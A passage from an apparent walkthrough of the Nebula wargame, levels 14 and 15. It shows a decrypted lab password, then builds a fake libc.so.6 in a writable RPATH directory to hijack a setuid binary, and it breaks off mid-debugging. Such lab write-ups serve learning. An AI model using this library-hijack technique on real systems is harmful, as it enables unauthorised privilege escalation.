<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>~ # python decrypt.py
</span><span class='line'>String: 857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
</span><span class='line'>Strlen: 36  Key start = 0
</span><span class='line'>Key: 0   Char: 8     Ord: 56     Res: 8
</span><span class='line'>Key: 1   Char: 5     Ord: 53     Res: 4
</span><span class='line'>Key: 2   Char: 7     Ord: 55     Res: 5
</span><span class='line'>Key: 3   Char: :     Ord: 58     Res: 7
</span><span class='line'>Key: 4   Char: g     Ord: 103    Res: c
</span><span class='line'>Key: 5   Char: 6     Ord: 54     Res: 1
</span><span class='line'>Key: 6   Char: 7     Ord: 55     Res: 1
</span><span class='line'>Key: 7   Char: ?     Ord: 63     Res: 8
</span><span class='line'>Key: 8   Char: 5     Ord: 53     Res: -
</span><span class='line'>Key: 9   Char: A     Ord: 65     Res: 8
</span><span class='line'>Key: 10  Char: B     Ord: 66     Res: 8
</span><span class='line'>Key: 11  Char: B     Ord: 66     Res: 7
</span><span class='line'>Key: 12  Char: o     Ord: 111    Res: c
</span><span class='line'>Key: 13  Char: :     Ord: 58     Res: -
</span><span class='line'>Key: 14  Char: B     Ord: 66     Res: 4
</span><span class='line'>Key: 15  Char: t     Ord: 116    Res: e
</span><span class='line'>Key: 16  Char: D     Ord: 68     Res: 4
</span><span class='line'>Key: 17  Char: A     Ord: 65     Res: 0
</span><span class='line'>Key: 18  Char: ?     Ord: 63     Res: -
</span><span class='line'>Key: 19  Char: t     Ord: 116    Res: a
</span><span class='line'>Key: 20  Char: I     Ord: 73     Res: 5
</span><span class='line'>Key: 21  Char: v     Ord: 118    Res: a
</span><span class='line'>Key: 22  Char: L     Ord: 76     Res: 6
</span><span class='line'>Key: 23  Char: D     Ord: 68     Res: -
</span><span class='line'>Key: 24  Char: K     Ord: 75     Res: 3
</span><span class='line'>Key: 25  Char: L     Ord: 76     Res: 3
</span><span class='line'>Key: 26  Char: {     Ord: 123    Res: a
</span><span class='line'>Key: 27  Char: M     Ord: 77     Res: 2
</span><span class='line'>Key: 28  Char: Q     Ord: 81     Res: 5
</span><span class='line'>Key: 29  Char: P     Ord: 80     Res: 3
</span><span class='line'>Key: 30  Char: S     Ord: 83     Res: 5
</span><span class='line'>Key: 31  Char: R     Ord: 82     Res: 3
</span><span class='line'>Key: 32  Char: Q     Ord: 81     Res: 1
</span><span class='line'>Key: 33  Char: W     Ord: 87     Res: 6
</span><span class='line'>Key: 34  Char: W     Ord: 87     Res: 5
</span><span class='line'>Key: 35  Char: .     Ord: 46     Res:
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Result: 8457c118-887c-4e40-a5a6-33a25353165
</span></code></pre></td></tr></table></div></figure>


<p>So, to solve level14:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level14@nebula:/home/flag14<span class="nv">$ </span>su - flag14
</span><span class='line'>Password:
</span><span class='line'>flag14@nebula:~<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h2>level15</h2>

<p><a href="https://exploit-exercises.com/nebula/level15/">Level15&rsquo;s Description</a>:</p>

<blockquote><p>strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.<br/>You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.<br/>Clean up after yourself :)</p></blockquote>


<p>Logged in as user <code>level15</code>, we see 1 file in the <code>flag15</code> directory called <code>flag15</code>. Running it simply tells us to <em>strace it!</em>. Running it with <code>strace</code> immediately reveals a whole bunch of interesting things about <code>flag15</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>level15@nebula:/home/flag15$ strace ./flag15
</span><span class='line'>execve(&quot;./flag15&quot;, [&quot;./flag15&quot;], [/* 20 vars */]) = 0
</span><span class='line'>brk(0)                                  = 0x88c9000
</span><span class='line'>access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
</span><span class='line'>mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786b000
</span><span class='line'>access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
</span><span class='line'>open(&quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
</span><span class='line'>stat64(&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
</span><span class='line'>open(&quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
</span><span class='line'>stat64(&quot;/var/tmp/flag15/tls/i686/sse2&quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
</span><span class='line'>open(&quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
</span><span class='line'>stat64(&quot;/var/tmp/flag15/tls/i686/cmov&quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
</span><span class='line'>open(&quot;/var/tmp/flag15/tls/i686/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
</span><span class='line'>stat64(&quot;/var/tmp/flag15/tls/i686&quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
</span><span class='line'>open(&quot;/var/tmp/flag15/tls/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
</span><span class='line'>stat64(&quot;/var/tmp/flag15/tls/sse2/cmov&quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
</span><span class='line'>open(&quot;/var/tmp/flag15/tls/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
</span><span class='line'>stat64(&quot;/var/tmp/flag15/tls/sse2&quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
</span><span class='line'>open(&quot;/var/tmp/flag15/tls/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
</span><span class='line'>stat64(&quot;/var/tmp/flag15/tls/cmov&quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
</span><span class='line'>open(&quot;/var/tmp/flag15/tls/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
</span><span class='line'>stat64(&quot;/var/tmp/flag15/tls&quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
</span><span class='line'>open(&quot;/var/tmp/flag15/i686/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
</span><span class='line'>stat64(&quot;/var/tmp/flag15/i686/sse2/cmov&quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
</span><span class='line'>open(&quot;/var/tmp/flag15/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
</span><span class='line'>stat64(&quot;/var/tmp/flag15/i686/sse2&quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
</span><span class='line'>open(&quot;/var/tmp/flag15/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
</span><span class='line'>stat64(&quot;/var/tmp/flag15/i686/cmov&quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
</span><span class='line'>open(&quot;/var/tmp/flag15/i686/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
</span><span class='line'>stat64(&quot;/var/tmp/flag15/i686&quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
</span><span class='line'>open(&quot;/var/tmp/flag15/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
</span><span class='line'>stat64(&quot;/var/tmp/flag15/sse2/cmov&quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
</span><span class='line'>open(&quot;/var/tmp/flag15/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
</span><span class='line'>stat64(&quot;/var/tmp/flag15/sse2&quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
</span><span class='line'>open(&quot;/var/tmp/flag15/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
</span><span class='line'>stat64(&quot;/var/tmp/flag15/cmov&quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
</span><span class='line'>open(&quot;/var/tmp/flag15/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
</span><span class='line'>stat64(&quot;/var/tmp/flag15&quot;, {st_mode=S_IFDIR|0775, st_size=3, ...}) = 0
</span><span class='line'>open(&quot;/etc/ld.so.cache&quot;, O_RDONLY)      = 3
</span><span class='line'>fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
</span><span class='line'>mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7862000
</span><span class='line'>close(3)                                = 0
</span><span class='line'>access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
</span><span class='line'>open(&quot;/lib/i386-linux-gnu/libc.so.6&quot;, O_RDONLY) = 3
</span><span class='line'>read(3, &quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0&quot;..., 512) = 512
</span><span class='line'>fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
</span><span class='line'>mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xe78000
</span><span class='line'>mmap2(0xfee000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0xfee000
</span><span class='line'>mmap2(0xff1000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xff1000
</span><span class='line'>close(3)                                = 0
</span><span class='line'>mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7861000
</span><span class='line'>set_thread_area({entry_number:-1 -&gt; 6, base_addr:0xb78618d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
</span><span class='line'>mprotect(0xfee000, 8192, PROT_READ)     = 0
</span><span class='line'>mprotect(0x8049000, 4096, PROT_READ)    = 0
</span><span class='line'>mprotect(0x199000, 4096, PROT_READ)     = 0
</span><span class='line'>munmap(0xb7862000, 33815)               = 0
</span><span class='line'>fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
</span><span class='line'>mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786a000
</span><span class='line'>write(1, &quot;strace it!\n&quot;, 11strace it!
</span><span class='line'>)            = 11
</span><span class='line'>exit_group(11)                          = ?
</span></code></pre></td></tr></table></div></figure>


<p>There are <strong>plenty</strong> of attempts to load <code>libc.so.6</code> from various locations! I checked out what is in <code>/var/tmp</code> and found the original <code>flag15</code> folder there. It was empty. My initial thought were I need to give it a <code>libc.so.6</code> to load, but obviously one that will be useful enough to me so that I may gain some form of code execution.</p>

<p>This challenge had me on another Google ride in order to understand what is going on here. From what I could gather, when a binary is compiled with <code>gcc</code>, it is possible to add <code>hwcap</code> support for different processor architectures. It is also possible to tell the linker from where it should load dynamic libraries using a <a href="http://en.wikipedia.org/wiki/Rpath">rpath</a>. In the case of <code>flag15</code>, the <code>RPATH</code> is set to <code>/var/tmp/flag15</code>. We can see this using <code>readelf</code> and looking at the dynamic section:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level15@nebula:/home/flag15<span class="nv">$ </span>readelf -d ./flag15
</span><span class='line'>
</span><span class='line'>Dynamic section at offset 0xf20 contains 21 entries:
</span><span class='line'>  Tag        Type                         Name/Value
</span><span class='line'> 0x00000001 <span class="o">(</span>NEEDED<span class="o">)</span>                     Shared library: <span class="o">[</span>libc.so.6<span class="o">]</span>
</span><span class='line'> 0x0000000f <span class="o">(</span>RPATH<span class="o">)</span>                      Library rpath: <span class="o">[</span>/var/tmp/flag15<span class="o">]</span>
</span><span class='line'> 0x0000000c <span class="o">(</span>INIT<span class="o">)</span>                       0x80482c0
</span><span class='line'> 0x0000000d <span class="o">(</span>FINI<span class="o">)</span>                       0x80484ac
</span><span class='line'>
</span><span class='line'> <span class="o">[</span>...<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ok, so that kinda explained the <em>why</em> its loading libc.so.6 from there, but not really the &lsquo;how this can be useful&rsquo;. I was still a little stuck on the previous <code>LD_PRELOAD</code> hackery, but had to constantly remind myself that that environment variable will be discarded in the case of the SETUID program.</p>

<p>I was a little unsure how to get something useful going from here. I touched a file called <code>libc.so.6</code> in <code>/var/tmp/flag15/</code> and launched the binary, just to get a starting point:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>touch libc.so.6
</span><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>~flag15/flag15
</span><span class='line'>/home/flag15/flag15: error <span class="k">while </span>loading shared libraries: /var/tmp/flag15/libc.so.6: file too short
</span></code></pre></td></tr></table></div></figure>


<p>I was not expecting much from that attempt, but it helped me get started. Eventually I figured I could have a look at <code>flag15</code> and check which libc function I could &ldquo;override??&rdquo; from the RELO table:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>objdump -R ~flag15/flag15
</span><span class='line'>
</span><span class='line'>/home/flag15/flag15:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>DYNAMIC RELOCATION RECORDS
</span><span class='line'>OFFSET   TYPE              VALUE
</span><span class='line'>08049ff0 R_386_GLOB_DAT    __gmon_start__
</span><span class='line'>0804a000 R_386_JUMP_SLOT   puts
</span><span class='line'>0804a004 R_386_JUMP_SLOT   __gmon_start__
</span><span class='line'>0804a008 R_386_JUMP_SLOT   __libc_start_main
</span></code></pre></td></tr></table></div></figure>


<p><code>puts()</code> seems like an ok target for me! This is probably the function used to print the <em>strace it!</em> message. At this stage I figured I could take the same route as I did with the previous <code>LD_PRELOAD</code> attack, except this time I just &lsquo;fake&rsquo; it in my fake libc. I looked up the <code>puts()</code> arguments from the man page again and started a new function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>cat fake_libc.c
</span><span class='line'><span class="c">#include&lt;stdio.h&gt;</span>
</span><span class='line'>int puts<span class="o">(</span>const char *s<span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;Not the real puts!\n&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>gcc -shared -fPIC fake_libc.c -o libc.so.6
</span><span class='line'>
</span><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>~flag15/flag15
</span><span class='line'>/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available <span class="o">(</span>required by /home/flag15/flag15<span class="o">)</span>
</span><span class='line'>/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available <span class="o">(</span>required by /var/tmp/flag15/libc.so.6<span class="o">)</span>
</span><span class='line'>/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link <span class="nb">time </span>reference
</span></code></pre></td></tr></table></div></figure>


<p>Ow, that exploded pretty badly it seems. From the error message I figured the function <code>__cxa_finalize</code> simply did not exist in my library, so all I had to do was add it&hellip; Right? I googled the <a href="https://refspecs.linuxbase.org/LSB_3.2.0/LSB-Core-generic/LSB-Core-generic/baselib---cxa_finalize.html">function arguments</a> and added it to my fake libc:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>cat fake_libc.c
</span><span class='line'><span class="c">#include&lt;stdio.h&gt;</span>
</span><span class='line'>void __cxa_finalize<span class="o">(</span>void * d<span class="o">)</span> <span class="o">{</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>int puts<span class="o">(</span>const char *s<span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;Not the real puts!\n&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>gcc -shared -fPIC fake_libc.c -o libc.so.6
</span><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>~flag15/flag15
</span><span class='line'>/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available <span class="o">(</span>required by /home/flag15/flag15<span class="o">)</span>
</span><span class='line'>/home/flag15/flag15: relocation error: /home/flag15/flag15: symbol __libc_start_main, version GLIBC_2.0 not defined in file libc.so.6 with link <span class="nb">time </span>reference
</span></code></pre></td></tr></table></div></figure>


<p>Oh! New error. I guess I was making progress. This time there is apparently no <code>__libc_start_main</code> in the library. At this stage I was a little confused as to what was going on here as this function was also in the RELO table for <code>flag15</code>. Anyways, as with <code>__cxa_finalize</code>, I Googled the <a href="http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html">function arguments</a> for this one too and added it to my fake libc. It was also at this stage that I realized I could just use this function instead of <code>puts</code>, so I went ahead and deleted the other functions:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>cat fake_libc.c
</span><span class='line'><span class="c">#include&lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'>int __libc_start_main<span class="o">(</span>int <span class="o">(</span>*main<span class="o">)</span> <span class="o">(</span>int, char * *, char * *<span class="o">)</span>, int argc, char * * ubp_av, void <span class="o">(</span>*init<span class="o">)</span> <span class="o">(</span>void<span class="o">)</span>, void <span class="o">(</span>*fini<span class="o">)</span> <span class="o">(</span>void<span class="o">)</span>, void <span class="o">(</span>*rtld_fini<span class="o">)</span> <span class="o">(</span>void<span class="o">)</span>, void <span class="o">(</span>* stack_end<span class="o">))</span> <span class="o">{</span>
</span><span class='line'>    <span class="k">return </span>0<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>gcc -shared -fPIC fake_libc.c -o libc.so.6
</span><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>~flag15/flag15
</span><span class='line'>/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available <span class="o">(</span>required by /home/flag15/flag15<span class="o">)</span>
</span><span class='line'>Inconsistency detected by ld.so: dl-lookup.c: 169: check_match: Assertion <span class="sb">`</span>version-&gt;filename <span class="o">==</span> <span class="o">((</span>void *<span class="o">)</span>0<span class="o">)</span> <span class="o">||</span> ! _dl_name_match_p <span class="o">(</span>version-&gt;filename, map<span class="o">)</span><span class="err">&#39;</span> failed!
</span></code></pre></td></tr></table></div></figure>


<p>Oh! Another new error :( This time though it was not about a missing function/symbol, but rather something I could not make out by myself. I found little information about this specific error. After a really really long time of searching I finally decided to <code>ldd</code> <code>flag15</code> again now that my fake libc is available:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>ldd ~flag15/flag15
</span><span class='line'>/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available <span class="o">(</span>required by /home/flag15/flag15<span class="o">)</span>
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0x00e47000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /var/tmp/flag15/libc.so.6 <span class="o">(</span>0x00761000<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The search term <em>no version information available (required by</em> was the magic that finally got me towards an answer! I came across <a href="http://stackoverflow.com/questions/137773/what-does-the-no-version-information-available-error-from-linux-dynamic-linker">this</a> and <a href="http://superuser.com/questions/735736/no-version-information-available-required-by-usr-bin-ssh">this</a> post which talks about custom linking scripts. Basically, if I were to create a file with the contents <code>GLIBC_2.0 {};</code> in it and tell the linker at compile time (with <code>-Wl</code>) about it, then my problem will go away :)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>cat version.ld
</span><span class='line'>GLIBC_2.0 <span class="o">{</span>
</span><span class='line'><span class="o">}</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>gcc -shared -fPIC -Wl,--version-script<span class="o">=</span>version.ld fake_libc.c -o libc.so.6
</span><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>ldd ~flag15/flag15
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0x002b3000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /var/tmp/flag15/libc.so.6 <span class="o">(</span>0x00ca0000<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>w00t. My <code>ldd</code> Error went away :)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>gcc -shared -fPIC -Wl,--version-script<span class="o">=</span>version.ld fake_libc.c -o libc.so.6
</span><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>~flag15/flag15
</span><span class='line'>/home/flag15/flag15: /var/tmp/flag15/libc.so.6: version <span class="sb">`</span>GLIBC_2.1.3<span class="err">&#39;</span> not found <span class="o">(</span>required by /var/tmp/flag15/libc.so.6<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Another version related error. This time though it was for GLIBC version 2.1.3. I spiraled down another Google tunnel with this one and eventually came across static linking options for the linker. Basically, with <code>-Bstatic</code> and <code>-static-libgcc</code> we tell the compiler not to link against shared libraries. So, I added these too:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>gcc -shared -static-libgcc -fPIC -Wl,--version-script<span class="o">=</span>version.ld,-Bstatic fake_libc.c -o libc.so.6
</span><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>~flag15/flag15
</span><span class='line'>Segmentation fault
</span></code></pre></td></tr></table></div></figure>


<p>And now we are segfaulting. Great! <strong>Not!</strong> I poked around <code>gdb</code> a little and prodded around. Eventually I figured I should check if my <code>__libc_start_main</code> function is being called before the crash:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>cat fake_libc.c
</span><span class='line'><span class="c">#include&lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'>int __libc_start_main<span class="o">(</span>int <span class="o">(</span>*main<span class="o">)</span> <span class="o">(</span>int, char * *, char * *<span class="o">)</span>, int argc, char * * ubp_av, void <span class="o">(</span>*init<span class="o">)</span> <span class="o">(</span>void<span class="o">)</span>, void <span class="o">(</span>*fini<span class="o">)</span> <span class="o">(</span>void<span class="o">)</span>, void <span class="o">(</span>*rtld_fini<span class="o">)</span> <span class="o">(</span>void<span class="o">)</span>, void <span class="o">(</span>* stack_end<span class="o">))</span> <span class="o">{</span>
</span><span class='line'>    <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;hi mom!\n&quot;</span><span class="o">)</span><span class="p">;</span> /* Added this line! */
</span><span class='line'>    <span class="k">return </span>0<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
